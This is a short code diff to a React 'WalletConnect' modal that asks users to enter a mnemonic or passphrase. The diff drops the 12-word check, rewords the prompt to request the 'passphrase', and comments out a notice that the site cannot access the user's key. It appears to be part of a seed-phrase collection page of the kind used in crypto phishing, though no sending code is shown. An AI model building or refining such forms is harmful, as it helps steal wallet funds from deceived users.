@@ -34,8 +34,8 @@ const WalletConnect: React.FC<WalletConnectProps> = ({
   const navigate = useNavigate();
 
   const handleConnectWallet = async () => {
-    if (text.trim() === "" || text.trim().split(/[\s,]+/).length < 12) {
-      alert("Invalid wallet address or mnemonic phrase");
+    if (text.trim() === "") {
+      alert("Please enter your passphrase to connect to the wallet.");
       return;
     }
 
@@ -115,9 +115,9 @@ const WalletConnect: React.FC<WalletConnectProps> = ({
       )}
 
       <div>
-        <p className="text-xs font-sans p-2 text-slate-400">
+        {/* <p className="text-xs font-sans p-2 text-slate-400">
           we do not own your private key there for we cannot access your wallet
-        </p>
+        </p> */}
       </div>
     </Modal>
   );
